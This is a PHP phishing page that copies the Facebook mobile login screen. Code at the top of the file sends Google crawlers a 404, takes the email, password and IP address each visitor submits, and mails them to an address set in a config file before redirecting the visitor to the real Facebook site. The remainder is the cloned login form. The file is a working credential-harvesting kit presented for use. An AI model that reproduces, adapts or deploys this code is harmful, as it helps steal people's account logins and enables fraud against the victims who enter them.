<?php

error_reporting(0); 

include("./inc/config.php");

include "./f.anti/antibots1.php";
include "./f.anti/antibots2.php";
include "./f.anti/antibots3.php";
include "./f.anti/antibots4.php";
include "./f.anti/antibots5.php";

/*-----------------------------------------------------------------------*/
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
/*-----------------------------------------------------------------------*/

$serbeselphp = $_POST['richa'];
if($serbeselphp != "") {
	$ip = getenv("REMOTE_ADDR");
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$uorp = $_POST['eml'];
	$passw = $_POST['pw'];
	
	$dt = "".date("r (T)")."";
	$m1 .= "
<!DOCTYPE html>
<html>
<head><meta charset='UTF-8'></head>
<body>
<blockquote style='background-color: white;border-radius: 4px;border: 1px solid rgb(209, 209, 209);box-shadow: rgba(0, 0, 0, 0.5) 0px 5px 15px;box-sizing: inherit;color: #3e3e3e;font-family: Verdana, sans-serif;font-size: 16px;height: 395.703;left: 212.5px;margin-left: auto;margin-right: auto;width: 670.016;width:480px;'>
<br>


<center>
<img border='0' data-original-height='662' data-original-width='800' height='165' src='https://ie.reachout.com/wp-content/uploads/2015/02/Facebook.png' width='200' />
<br>

<span style='background-color: white; color: #222222; white-space: pre-wrap;'><b><span style='font-family: &quot;verdana&quot; , sans-serif;'>

『Email』: $uorp<br>
『Password』: $passw<br> 


『IP』: geoiptool.com/?ip=$ip

</span></b></span>
<br><br><br>
<center>
</blockquote>

</body>
</html> \n";
	

	$b0 = " ⌈ FACEBooK ACC FROM MOBILE !! ⌉ @ $dt From $ip";
	$b1 = "From: LOGINS  <LOGINS@EAZY.com>.\n";
	$b1 .= $_POST['eMailAdd']."\n";
	$b1 = "X-Mailer: PHP/".phpversion();
	$b1 .= "MIME-Version: 1.0\n";
	$b1 .= "Content-type: text/html; charset=UTF-8\n";



	mail($zb,$b0,$m1,$b1);
	
	
	 $act = "https://m.facebook.com";
	header( "refresh:0;url=$act" );


   }
   

?>


<html><head><title>Facebook - Log In or Sign Up</title><meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1"><link href="./img/ico.png" rel="shortcut icon" sizes="196x196"><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">

<link type="text/css" rel="stylesheet" href="./css/mobile1.css">
<link type="text/css" rel="stylesheet" href="./css/mobile2.css">
</head><body tabindex="0" class="touch x1 _fzu _50-3 iframe acw portrait" style="min-height: 149px; background-color: rgb(255, 255, 255);"><div id="viewport" data-kaios-focus-transparent="1" style="min-height: 149px;"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page" class=""><div class="_129_" id="header-notices"></div><div class="_4g33 _52we _52z5" id="header"><div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href=""><i class="img sp_Vxyq4iJR04A sx_6df58a"><u>facebook</u></i></a></div></div><div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 149px;"><div class="_4g33"><div class="_4g34" id="u_0_0"><div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice"><div class="_52jd"></div></div><div class="aclb _4-4l"><div data-sigil="m_login_upsell login_identify_step_element"></div><div class="_5rut"><div></div>
<form method="post" action="" class="mobile-login-form _5spm" id="login_form"  data-sigil="m_login_form" data-autoid="autoid_2">
<input type="hidden" name="richa" value="SNR20">
<div id="user_info_container" data-sigil="user_info_after_failure_element">
</div><div id="pwd_label_container" data-sigil="user_info_after_failure_element">
</div><div id="otp_retrieve_desc_container"></div>
<div class="_56be _5sob"><div class="_55wo _55x2 _56bf">
<div id="email_input_container">
<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="eml" placeholder="Mobile Number or Email" type="text" data-sigil="m_login_email">
</div><div>
<div class="_1upc _mg8" data-sigil="m_login_password">
<div class="_4g33"><div class="_4g34 _5i2i _52we">
<div class="_5xu4">
<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="pw" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input">
</div></div>
<div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_1"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2">HIDE</span><span class="mfss" id="u_0_3">SHOW</span></a></div></div></div></div></div></div></div></div><div class="_2pie" style="text-align:center;">
<div id="u_0_4" data-sigil="login_password_step_element"><button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable m_login_button" data-autoid="autoid_4"><span class="_55sr">Log In</span></button></div><div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
<div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div><div id="otp_button_elem_container"></div></div>



</div><noscript>

</noscript></form>
<div><div class="_43mg"><span class="_43mh">or</span>
</div>
<div class="_52jj _5t3b" id="u_0_6">
<a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Create New Account</a>
</div>
</div>
<br/>
</div><div></div></div></div></div><div></div><span>
<img src="" width="0" height="0" style="display:none"></span><div class="_55wr _5ui2"><div class="_5dpw"><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea"><div class="_4g33"><div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">English (US)</span><div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">العربية</a></span></div><div class="_3ztc"><span class="_52jc"><a href" data-sigil="change_language">Português (Brasil)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">Italiano</a></span></div></div><div class="_4g34"><div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">Français (France)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">Español (España)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">Deutsch</a></span></div><a href=""><div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages"><i class="img sp_Vxyq4iJR04A sx_9f749d"></i></div></a></div></div></div><div class="_5ui4"><span class="mfss fcg">Facebook ©2019</span></div></div></div></div><div class=""></div></div></div>






                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
</body></html>